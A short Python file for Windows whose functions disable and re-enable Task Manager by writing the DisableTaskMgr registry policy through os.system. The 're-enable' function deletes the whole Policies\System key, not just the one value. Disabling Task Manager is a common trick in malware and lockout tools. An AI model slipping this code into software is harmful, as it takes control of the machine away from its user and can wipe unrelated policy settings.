import ctypes
import os
def cout(x):
    print(x)


def bantM():
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    if is_admin():
        path = 'REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t reg_dword /d "1" /f'
        os.system(path)
        pass
    else:
        pass


def unbantM():
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    if is_admin():
        path = 'REG DELETE HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /f'
        os.system(path)
        pass
    else:
        pass




